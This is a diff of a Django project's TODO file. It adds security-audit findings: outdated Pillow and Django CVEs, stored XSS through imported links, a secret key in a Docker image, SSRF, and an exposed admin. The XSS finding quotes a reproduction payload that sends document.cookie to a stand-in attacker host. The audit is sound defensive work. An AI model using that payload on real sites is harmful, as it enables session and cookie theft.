@@ -1,7 +1,7 @@
 # Project Improvements TODO
 
-Pending work is listed first, ordered by priority; completed items are kept at the
-bottom as a record of what changed and why.
+Pending work is listed first, ordered by priority; completed work is indexed at the
+bottom, with the detail in `CHANGELOG.md`.
 
 Priority criteria, in order: exposure of the live site at www.mojon.es, then measured
 cost on the request path, then maintainability, then cosmetics. Items whose cost is
@@ -10,91 +10,171 @@ public path.
 
 ## Pending
 
+Everything below came out of the security audit of 2026-08-11, ordered by criticality.
+Findings marked *(verified)* were reproduced against the running system; the rest are
+from reading the code and the deployed configuration. Nothing here is known to have been
+exploited — the two critical items are outdated dependencies, not defects introduced
+here.
+
+### Critical
+
+- [ ] **Pillow 12.1.0 is exposed to two remote-code-execution CVEs, and it parses images
+  downloaded from the internet.** `CVE-2026-25990` (out-of-bounds write, affects 10.3.0
+  through 12.1.0) and `CVE-2026-42311` (integer overflow, fixed in 12.2.0) both trigger
+  on a crafted PSD file and can lead to arbitrary code execution; `CVE-2026-59203` (EPS
+  parser infinite loop, fixed in 12.3.0) hangs the process. This is not theoretical here:
+  `scrapit` and `redownload_images` fetch image URLs taken from scraped HTML and hand the
+  bytes to Pillow through `ImageFile`, and **Pillow picks its decoder by sniffing the
+  content, not the extension** — a URL ending in `.webp` that serves a PSD is parsed by
+  the PSD decoder. The chain is: hostile or compromised image host → crafted file →
+  memory corruption inside the container. Fix: pin `Pillow>=12.3.0`. Verified 12.1.0 is
+  what runs in production. *(verified: version in production)*
+
+- [ ] **Django 6.0.1 is five security releases behind.** 6.0.2, 6.0.3, 6.0.4, 6.0.6 and
+  6.0.8 have shipped since, three of them carrying "high" severity fixes. Several land
+  directly on code this project uses, which is why this is not a routine bump:
+  `CVE-2025-14550` is a denial of service in `ASGIRequest` via repeated headers, and the
+  site is served by uvicorn over ASGI; `CVE-2026-25674` is about the file-based cache and
+  file-system storage backends creating objects with unintended permissions through a
+  umask race, and this project uses both; `CVE-2026-35193`, `CVE-2026-8404` and
+  `CVE-2026-48587` are all private-data exposure through `cache_page` and `Vary`
+  handling, and **every public view here is wrapped in `@cache_page`**; `CVE-2026-15920`
+  is cross-site scripting via `URLField` values rendered as links in the admin, which is
+  the same class of bug as the stored-XSS item below and reaches the same data. Fix:
+  upgrade to 6.0.8 and re-run the suite. *(verified: version in production)*
+
 ### High
 
-Empty: nothing outstanding currently threatens the live site or the request path.
+- [ ] **A `javascript:` link imported from a channel list reaches the page's `href`
+  unvalidated — stored XSS.** `ChannelLink.link` declares `validators=[validate_channel_link]`
+  and that validator does reject the payload, but **Django only runs field validators from
+  `full_clean()`, which `Model.save()` never calls — and there is not a single `full_clean()`
+  call in the codebase.** The import path uses `ChannelLink.objects.update_or_create(link=...)`,
+  so the validator added for exactly this purpose is dead code outside the admin form.
+  Reproduced end to end: importing `javascript:fetch('https://evil.example/'+document.cookie)`
+  stores it and `link_button.html` renders `href="javascript:..."`; a `data:text/html;base64,…`
+  URI gets through the same way. Escaping does not help — the payload is the URL, not
+  markup. It fires on click, and `target="_blank"` is only applied to `http` schemes, so it
+  runs in the page's own origin. The input is third-party: `newera.txt`, `elcano.txt` and
+  `.m3u` files come from outside. Fix: enforce the scheme where the data enters
+  (`import_entries`), not only in the admin — either by calling `full_clean()` or by
+  filtering before the upsert — and add a template-side guard so a row already in the
+  database cannot render a dangerous scheme. Existing rows need auditing. *(verified)*
+
+- [ ] **`.env.production` — which holds `DJANGO_SECRET_KEY` — is baked into the Docker
+  image.** `.dockerignore` lists `.env`, and that pattern matches only that exact
+  filename, not `.env.production` or `.env.production.local`; `COPY . .` then copies all
+  of them. Confirmed by inspecting the built image directly rather than the dev container,
+  which bind-mounts the source and would have proved nothing. The key is otherwise sound
+  (52 characters, ~310 bits), but a secret in an image layer survives in the host's layer
+  cache and in any exported or shared image, and leaking it means forged sessions and
+  signed cookies against an admin that answers to the public internet. Fix: add
+  `.env*` to `.dockerignore` with `!.env.example` kept, rebuild, and rotate the key —
+  it must be treated as exposed. *(verified: read out of `soccertime:latest`)*
 
 ### Medium
 
-Empty.
+- [ ] **The admin is reachable from the internet with nothing slowing down a password
+  guess.** `https://www.mojon.es/soccertime/admin/login/` answers 200 to the world, and
+  there is no rate limiting, lockout, IP allowlist or second factor anywhere in the
+  stack. The cookies are `Secure` and the path is prefixed, but neither is an obstacle to
+  credential stuffing. Cheapest effective fix, in order of preference: restrict the route
+  at Traefik to known addresses, or move it to a non-guessable path plus a login throttle.
+  *(verified: HTTP 200 from outside)*
+
+- [ ] **`DJANGO_ALLOWED_HOSTS=*` disables Django's Host header validation** while
+  `DJANGO_USE_X_FORWARDED_HOST=true` makes Django trust a header the client can set.
+  Traefik only routes `mojon.es` and `www.mojon.es`, so this is defence in depth rather
+  than an open door — but it is the layer that catches the day the proxy rule is loosened
+  or something reaches the container directly, and the site caches responses for an hour,
+  which is what turns a poisoned absolute URL into everyone's problem. Fix: set it to the
+  two real hostnames.
+
+- [ ] **The image downloader accepts anything, of any size, from any address.**
+  `download_image` passes `stream=True` and then reads `response.content`, which pulls the
+  whole body into memory regardless of length — the 10-second timeout is per read, so a
+  slow drip keeps it alive — inside a container limited to 512 MB. There is no
+  content-type check, no cap on size, no restriction on the scheme or destination, and
+  redirects are followed by default, so a URL from scraped HTML can point at a private
+  address (SSRF). Related: `save_image` takes the stored file extension straight from the
+  source URL with no allowlist, so a file that Pillow accepts but whose URL ends in
+  `.html` would be written into the media volume and served by nginx as `text/html` from
+  the site's own origin — `nosniff` does not help when the extension is explicit. All 8116
+  files currently stored are `.webp`, so nothing is wrong today. Fix: cap the download
+  size, verify the content type, and derive the extension from the decoded image rather
+  than the URL.
+
+- [ ] **No `Content-Security-Policy`.** Confirmed absent from the live response, which
+  carries HSTS, `nosniff`, `X-Frame-Options: DENY` and a referrer policy but no CSP.
+  Django 6.0 ships CSP support natively, so this no longer needs a third-party package.
+  It is what would have contained the stored-XSS finding above, and it is the reason to
+  do it even after that one is fixed. Note the templates carry inline `<script>` blocks,
+  so this needs nonces rather than a one-line setting.
+
+- [ ] **The image defaults to insecure and relies on an unversioned file to correct it.**
+  The Dockerfile bakes `DJANGO_DEBUG=true` and `DJANGO_ADMIN_ENABLED=true`; production is
+  safe only because `.env.production` overrides them, and that file is deliberately not in
+  the repository. If it is missing or an entry is dropped, the container comes up in debug
+  mode — full stack traces and settings to any visitor — and, with no `DJANGO_SECRET_KEY`
+  set, falls back to the hardcoded `dev-only-insecure-key-not-for-production`, which makes
+  session forgery trivial. Fix: default the image to the safe values and let development
+  opt in, which is the direction the rest of the settings module already takes.
 
 ### Low
 
-Empty.
+- [ ] **The production image ships the test, lint and type-checking toolchain.**
+  `requirements.txt` has one list for everything, so pytest, ruff, mypy and django-stubs
+  are installed in production — confirmed by listing packages in the running container.
+  No known vulnerability, just avoidable surface and image size. Fix: split into
+  `requirements.txt` and `requirements-dev.txt`.
+
+- [ ] **`lxml` is the one unpinned dependency.** Every other line in `requirements.txt`
+  carries an exact version; `lxml` sits alone at the bottom with none, so a rebuild can
+  silently change the HTML parser the scraper depends on, and there is no record of what
+  was tested. It resolved to 6.1.1. Fix: pin it.
+
+- [ ] **The `search` parameter is unbounded.** `/agenda/?search=…` accepts any length and
+  runs `icontains` across four joined tables in SQLite, and the first request for a given
+  string is always a cache miss. Cheap to abuse, cheap to fix: cap the length.
+
+- [ ] **`.env.production.local` carries a 20-character secret key** (~114 bits) against
+  the 52 characters used in production. It is a local staging file, so the impact is
+  limited, but it costs nothing to generate a proper one.
 
 ## Done
 
-### Channel matching — 2026-08-10
-- [x] **Pinned `match_channels` down with tests, then rewrote it.** It decides which channel a scraped link attaches to and had no direct tests, which is why it had been parked: a mistake there does not raise, it silently points a stream at the wrong channel. 41 cases now cover every branch and malformed input. The rewrite matches in memory against the channel list: **1236 queries and 638 ms down to 1 query and 11 ms** for 200 names, verified to return identical results across all 87 production channel names and their variants.
-- [x] **Two bugs the tests found.** A name that normalises to empty matched every channel with a bracketed suffix — 34 of them — and is reachable, since `fix_name` reduces a name that is only a mirror marker to nothing; production was checked and unaffected. And SQLite only case-folds ASCII, so `iexact` never saw "ARAGÓN TV" as "Aragón TV": twelve channels carry accents and playlists shout their names, so those links were being dropped as belonging to no channel.
+Detail for each of these is in `CHANGELOG.md` under the version that shipped it, and in
+the git history. Kept here as an index of what has been through this file.
 
-### Type hints — 2026-08-10
-- [x] **Annotated the application code and put a checker behind it.** 188 functions across 19 modules; mypy with django-stubs went from 200 errors to none, and `make typecheck` keeps it there. Ruff's ANN rules run inside `make lint`, so a function that arrives unannotated now fails the lint that is already part of the workflow — verified by feeding it one. `ANN401` is off, with the reason recorded: the admin display callables genuinely receive any model, and `*args`/`**kwargs` follow signatures Django dictates, so forbidding `Any` would only buy false precision. Tests stay out of scope by agreement.
-- [x] **Deleted `channel_matchers.py`.** 320 lines nothing imported, Django advertised it in `manage.py help`, and running it failed for want of a `Command` class.
-- [x] **Fixed what the checker found**, which was the point of having one: the scraping dataclasses declared every field optional while `parse_iter` only ever yields complete events, and `Event.details` claimed to be an `EventDetails` when the code passes `MatchDetails` and `RaceDetails`, which do not inherit from it — now a declared union, narrowed by the `isinstance` dispatch that was already there. `sorted(key=lambda t: opponent_dates.get(t.id))` would have raised `TypeError` had the lookup ever missed. `channel_link.link[:40]` indexed a nullable field. `IMG_WIDTH_DIVISOR` was typed `int` but is `1.5` on `Flag`. Two `storage.exists(name)` calls passed a possibly-null name.
-
-### Blocks E and F — 2026-08-10
-- [x] **Moved the MTI note where it can actually stop someone.** It was never work: `Match`, `Race` and `SimpleEvent` each have their own table joined to `soccertime_event`, and that join is the price of listing every kind of event together, which the agenda depends on. The measurement — 0 extra queries across 25 events, because `with_related()` lets the child share the parent's caches — now lives in the `Event` docstring and in `AGENTS.md`, next to the code someone would be tempted to "optimise", rather than in a backlog they would not be reading.
-- [x] **Rewrote `LinkSchemeFilter` to resolve the schemes in the database.** It read every link into Python to parse it, and returned the options from a set, so the dropdown order changed between processes. Now one `DISTINCT` query, ordered, covered by a query-count test.
-- [x] **Stopped using private Django API in the admin.** `field._choices` becomes the public `field.choices`, and the generated relation columns are attached once in `__init__`, at registration, instead of being rewritten on the shared `ModelAdmin` instance by every request. The names stay, because five subclasses look them up with `list_display.index(...)`.
-- [x] **Gave `self.warnings` an owner.** `import_entries` reads it, so the base command creates it; a subclass that forgot used to break the shared pipeline rather than its own.
-- [x] **Replaced the dry-run exception abuse** with `transaction.set_rollback(True)`, removing a `try`/`except` that raised `TransactionManagementError` at itself to force a rollback.
-- [x] **Removed the duplicated `is_favorite_event`** — the constant `False` now lives on `Event` and only `Match` overrides it — and **centralised `event_type`**: each subclass declares `EVENT_TYPE` and `Event.save()` applies it, replacing three near-identical `save()` overrides.
-- [x] **Made the view context consistent.** `get_base_context(with_teams=False)` replaces the pattern of asking for the favourite teams and popping them back out, the two views that assembled their context by hand now use it, and the function-level imports moved to module scope. Verified the favourites strip still renders on the agenda only, as before.
-- [x] **Wrapped the user-facing strings in `gettext_lazy`**, as named constants so they are visible in one place. The site keeps serving them in Spanish — there is no catalogue to translate against — so nothing changed on screen.
-
-### Block D — 2026-08-10
-- [x] **Confirmed the `ChannelLink` ordering is intentional.** "Freshest day first, and within that day the order the source listed the links in" is the wanted behaviour, so it stays: collapsing it to `-date_updated` would show every imported batch reversed. Recorded in the comment on `CHANNEL_LINK_ORDERING` so it is not mistaken for an accident again. Worth knowing that `verified` is `False` on all 377 rows, so that tiebreaker never fires until links start being checked.
-- [x] **Made the channels page order links the way the rest of the site does.** It sorted only by the keys the template regroups on, so the rows of a single card — which share all three — came back in whatever order the database chose: the same play buttons appeared as `[2413, 2414, 2504, ...]` in the agenda and `[2326, 2324, 2325, ...]` on the channels page, and that order could shift on its own when the table was rebuilt. `CHANNEL_LINK_ORDERING` is now the single definition used by both.
-- [x] **Translated the source artifacts to English.** Docstrings, comments and the output of the import commands, along with the Spanish stat keys inside the importer. The web interface stays in Spanish, since that is the language of the site; only code and CLI changed. The few Spanish strings left are comments quoting real channel names from the source data (`"Canal de Tenis" -> "tennis channel"`), which have to stay literal.
-
-### Medium blocks A, B and C — 2026-08-10
-- [x] **Restricted the `env` template filter to an allowlist** and **added the missing test modules**. The filter reaches every template, so `{{ "DJANGO_SECRET_KEY"|env }}` would have rendered the secret; only `DJANGO_DEBUG` is readable now. `filters.py` and the template filters had no tests at all and now do.
-- [x] **Removed the dead model properties** — `Sport.competitions_with_events`, `competitions_without_events`, `Competition.is_favorite` and `is_favorite_cached` — together with the tests that existed only to keep them alive.
-- [x] **Finished decoupling presentation from the models.** The markup moved to `soccertime/rendering.py`, used by the `render_image_markup` filter and by the admin, so there is one implementation instead of a model method plus an unused tag with its own copy of the fallback SVG. Templates lost their `|safe`. Verified the rendered HTML is byte-identical.
-- [x] **Fixed the cache configuration**: the file cache path is configurable via `DJANGO_CACHE_LOCATION`, and with caching off the backend is explicitly `DummyCache` rather than a per-process `LocMemCache` that made `cache.clear()` look effective.
-- [x] **Collapsed the triplicated upsert in `scrapit`** into one `upsert_event`, cutting the command by a third.
-
-### Production hardening and incidents — 2026-08-10
-- [x] **Acted on the media-loss findings.** Deleted `migrate_crests`: a one-off path migration from early 2026 whose "missing or empty file" branch erased crest references instead of leaving them for the scraper to repair, which is how 1357 teams lost theirs. Added `backup-remote-media`, kept on the host rather than inside the volume it protects, since losing that volume is the failure it guards against — 2 MB compressed, so worth keeping even though flags can be re-fetched from their stored URL and crests, which cannot, are exactly what a backup preserves. Both snapshots now rotate to `KEEP_BACKUPS` (2): the database copies had reached 150 MB, six of them taken by a single afternoon of deploys. `redownload_images` reports broken crest references alongside the flags it can restore; the pages themselves keep rendering the fallback icon, so a missing image never breaks the site.
-- [x] **Found out why 49 flag files were missing.** They were not deleted one by one: the directory paths never existed in the current media volume, which was created on 2026-02-02 and holds nothing older, while the database rows carrying those paths were already present on 2026-03-07. So the media was lost wholesale around the time that volume was created, and the database kept referring to files that were never copied into it. The scraper hides this, because `get_or_create_flag` re-downloads whenever the file is missing: everything that reappeared healed silently, and after six months the only survivors were the 49 belonging to competitions that never came back — one-off golf and WTA tournaments, Ligue 2 Algeria, Tour de Noruega Femenino. The same event hit crests far harder, and `migrate_crests` made it permanent instead of letting it heal, which is why that command was deleted. Nothing is user-visible today: none of the crestless teams have upcoming matches and no favourite is affected.
-- [x] **Verify the deploy automatically instead of by eye.** `deploy-production` reported "completed successfully" both times it left the site broken. It now ends with `remote-smoke-test`: wait for the container to report `healthy`, then fetch every public page **from outside the server**, which is the part that matters — when the health check failed, the application still answered 200 on localhost while the proxy served 404 to the world, so any check run inside the container would have passed. Verified against all three branches: a 404 page fails the run, an unhealthy or missing container fails on timeout, and a healthy deploy passes.
-- [x] **Enable the SSL redirect instead of silencing its check.** `security.W008` had been silenced as redundant, since Traefik already answers `http://` with a 301. It turned out to be genuinely fixable: Django only emits the HSTS header when `request.is_secure()` is true, and production does emit it, which proves `SECURE_PROXY_SSL_HEADER` works and the proxy forwards `X-Forwarded-Proto`. `check --deploy` went from 3 silenced checks to 2, and the remaining two — `includeSubDomains` and `preload` — are deliberate policy, not defects.
-- [x] **Exempt the health check from that redirect.** Enabling it took the site down: the container health check reaches the app directly over plain HTTP, got a 301, failed, and the orchestrator withdrew the route, so every page returned 404. `SECURE_REDIRECT_EXEMPT` keeps `healthz` unredirected; the regression test reproduces the 301 when the exemption is removed.
-- [x] **Restore the 49 flag images missing from the media volume.** Every `Flag` keeps the URL it was fetched from in its `name`, so all of them were recoverable. Added the `redownload_images` command (with `--dry-run`) and `make remote-redownload-images`; production now has 227/227 flags and 3313/3313 crests with both file and dimensions. The download moved to a shared `_image_download` module so `scrapit` and the command share one implementation. The cause was traced afterwards; see the entry below.
-- [x] **Codify the production operations that were being done over ad-hoc SSH.** `backup-remote-db` (now run automatically by `deploy-production` before migrating), `list-remote-backups`, `restore-remote-db`, `remote-check` and `remote-clear-cache`. Also fixed `BACKUP_SUFFIX`, which re-ran `date` on every expansion and could name a different file than the one it created.
-
-### Priority round — 2026-08-10
-- [x] **Harden the production security settings.** `check --deploy` reported 4 warnings while `/soccertime/admin/login/` answered 200 to the world, so the admin session and CSRF cookies travelled without the `Secure` flag. Added `SESSION_COOKIE_SECURE`, `CSRF_COOKIE_SECURE`, `SECURE_PROXY_SSL_HEADER`, `SECURE_SSL_REDIRECT` and the HSTS trio, all read from the environment through a new `env_flag()` helper so development stays on plain HTTP. Production enables secure cookies, the proxy header and `SECURE_HSTS_SECONDS=31536000`; going straight to a year was backed by checking that the five public pages serve zero `http://` resources, so the usual ramp had nothing left to discover. `includeSubDomains` and `preload` stay off deliberately, and `SECURE_SSL_REDIRECT` stays off because Traefik already answers `http://` with a 301 — the three matching checks are silenced with that rationale, leaving `check --deploy` clean.
-- [x] **`Event.Meta.ordering` forced two JOINs and a date cast on every query.** Reduced to `["date"]`, which took `Event` queries from 2 JOINs to 0 and `Match` from 3 to 1, and removed the `django_datetime_cast_date` that defeated the index. The listing order moved into a new `EventQuerySet.chronological()` — `date`, then sport order, then competition name — used by the six views that display events.
-- [x] **`render_image` opened every image file to measure it.** `Flag.image` and `Team.crest` now declare `width_field` / `height_field`, migration `0035` backfills the existing rows, and `render_image` reads the dimensions from the database, falling back to the file for rows that predate the change. Measured with fresh instances on a warm cache: **13.53 ms → 1.68 ms** per 40 images, byte-identical markup. The `storage.exists()` probe was kept on purpose — measured at 85 µs against 635 µs for a dimension read, it is cheap insurance against rendering broken images. Writing the tests exposed a real defect in the change: `save_image` handed a bare `BytesIO` to the field, which Django could not measure, and an unnamed `ImageFile` silently stored null dimensions; both are fixed and covered.
-
-### Original backlog
-- [x] **Optimize QuerySet/Manager DRYness:** use `EventQuerySet.as_manager()` instead of duplicating every QuerySet method on the Manager.
-- [x] **Decouple Presentation from Models:** move the HTML rendering out of `ImageMixin`. Finished later in block B, which put it in `soccertime/rendering.py`.
-- [x] **Improve URL Validation:** custom scheme validation for `ChannelLink.link` (`validate_channel_link`).
-- [x] **Dynamic Event Durations:** replace the hardcoded 2-hour duration in `Event.date_end` with a `DurationField`.
-- [x] **Database Schema Cleanup:** remove the redundant `event_ptr` from the `unique_together` constraints of `Match`, `Race` and `SimpleEvent`.
-- [x] **Refine Display Logic:** handle null `team` / `competition` in `Favorite.__str__`.
-
-### Code Review (Opus 4.6)
-- [x] **Remove Implicit `.with_related()` in EventManager:** it forced heavy `select_related` / `prefetch_related` JOINs on every query, including `.get()`, `.count()` and internal updates. Now chained explicitly in the views.
-- [x] **Fix Global Context N+1:** `get_favorite_competitions()` builds the global context for `base.html`, which reads `competition.flag.flag_image`; the missing `.select_related("flag")` triggered an N+1 on every page load.
-- [x] **Fix Admin N+1:** `EventModelAdmin.channels_names` iterated `obj.channels.all()` without prefetching. `get_queryset` now includes `.prefetch_related("channels")`.
-- [x] **Avoid Prefetch Invalidation:** `Competition.has_events` / `events_count` used `.filter(...).exists()` / `.count()`, bypassing the prefetch cache. Evaluated in Python instead.
-- [x] **Optimize Agenda Aggregation:** `Event.objects.aggregate(Max("date"))` joined every MTI table before computing the maximum.
-- [x] **Cache Objects in Scraping Command:** `scrapit.py` called `.get_or_create()` inside loops for Sport, Competition and Team; a local dictionary cache now absorbs those.
-- [x] **Avoid `hasattr` as Type Check:** `Event.child_event` relied on `hasattr(self, "match")`, which triggers an implicit query when `select_related` was not used.
-
-### Code Review (Opus 5) — 2026-08-10
-
-Findings marked *(confirmed)* were reproduced with a temporary test before being fixed;
-the rest were found by inspection. All were fixed and deployed on 2026-08-10.
-
-- [x] **Deleting a `ChannelLinkSource` wiped unrelated links (data loss)** *(confirmed)*: the receiver deleted **every** `ChannelLink` with zero sources, so a link created manually in the admin was destroyed the first time any source was deleted. Fixed: a `pre_delete` receiver captures the links attached to the source (the through rows are already gone by `post_delete`) and `delete_orphan_channel_links()` only removes those left source-less.
-- [x] **Reverse M2M edit crashed** *(confirmed)*: the `m2m_changed` receiver assumed `instance` was always a `ChannelLink`, so `source.links.remove(link)` — what the admin `ChannelLinkSource` form does — raised `AttributeError`. Fixed by honouring `reverse` / `pk_set`, capturing the affected pks in a `pre_clear` branch because `post_clear` does not report them.
-- [x] **`/agenda/?events-date=<garbage>` returned HTTP 500** *(confirmed)*: the raw query parameter reached `for_date()` and the ORM raised `ValidationError`. Fixed with `parse_requested_date()`; a malformed value is ignored and the default agenda is served.
-- [x] **`favorites()` returned duplicated events** *(confirmed)*: the multi-valued `favorite` reverse FK join duplicated the matches of a team listed in two `Favorite` rows. Fixed with `.distinct()`; `Exists()` subqueries remain a possible follow-up.
-- [x] **Scraping aborted when a crest URL was missing** *(confirmed)*: `save_match_event` called `requests.get()` with a possibly `None` URL and caught no network errors, killing the whole run. Fixed with a guarded `download_image()` helper plus `ensure_crest()`.
-- [x] **`update_or_create(link=...)` on a non-unique column**: `ChannelLink.link` lost its unique constraint in migration `0029`, so `import_entries` would raise `MultipleObjectsReturned` once two rows shared a link. Migration `0033` merges duplicates into the oldest row — inheriting its sources, channels and `verified` flag — turns empty strings into `NULL`, and restores `unique=True`.
-- [x] **Per-request messages leaked into cached pages**: `add_empty_message` added a `django.contrib.messages` entry inside `@cache_page` views, so the banner was stored in the shared page cache and served to unrelated visitors. Fixed: `empty_state()` puts the notice in the context and the templates render `soccertime/empty_state.html`, which also drops one `.exists()` query per view.
+- **Channel matching** (0.2.1, 2026-08-10) — pinned `match_channels` with 41
+  characterization tests, then rewrote it: 1236 queries and 638 ms down to 1 query and
+  11 ms. The tests found two silent bugs first, one of them dropping every accented
+  channel name.
+- **Type hints** (0.2.0, 2026-08-10) — annotated 188 functions across 19 modules, put
+  mypy and ruff's ANN rules behind them, and fixed the genuine type errors that surfaced.
+  Deleted `channel_matchers.py`, 320 dead lines Django was advertising as a command.
+- **Scraper reporting** (0.3.0, 2026-08-10) — events whose time is not yet announced are
+  counted and named instead of being silently folded into `skipped`.
+- **UI fixes** (0.3.1, 2026-08-11) — competition crest strip fits one row; the expander
+  hides when there is nothing to expand.
+- **Low-priority blocks D, E and F** (2026-08-10) — `LinkSchemeFilter` resolved in the
+  database, consistent `ChannelLink` ordering across the site, private Django API removed
+  from the admin, dry-run rollback done properly, duplicated model logic centralised, and
+  the MTI question settled with a measurement recorded next to the code.
+- **Medium blocks A, B and C** (2026-08-10) — the `env` template filter restricted to an
+  allowlist, which had made `{{ "DJANGO_SECRET_KEY"|env }}` render the secret; dead model
+  properties removed; presentation moved out of the models into `soccertime/rendering.py`;
+  cache configuration fixed; the triplicated upsert in `scrapit` collapsed.
+- **Production hardening and two self-inflicted outages** (2026-08-10) — `width_field` on
+  an `ImageField` and `SECURE_SSL_REDIRECT` without an exemption for the health check each
+  took the site down; both are now covered by regression tests and recorded in `CLAUDE.md`.
+  The deploy verifies itself from outside the server, the production operations live in
+  the `Makefile`, and the 49 missing flag images were restored and their loss explained.
+- **Performance round** (2026-08-10) — `Event.Meta.ordering` reduced from two JOINs and a
+  date cast to none, with listing order moved to `chronological()`; image dimensions read
+  from the database instead of opening every file, 13.53 ms → 1.68 ms per 40 images.
+- **Earlier reviews** — the Opus 4.6 round (N+1s in the global context, the admin and the
+  scraping command; implicit `with_related()`; prefetch invalidation) and the Opus 5 round
+  (a `ChannelLinkSource` deletion wiping unrelated links, a crashing reverse M2M edit, a
+  500 on a malformed date parameter, duplicated favourites, a scrape aborting on a missing
+  crest URL, a lost unique constraint, and per-request messages leaking into cached pages).
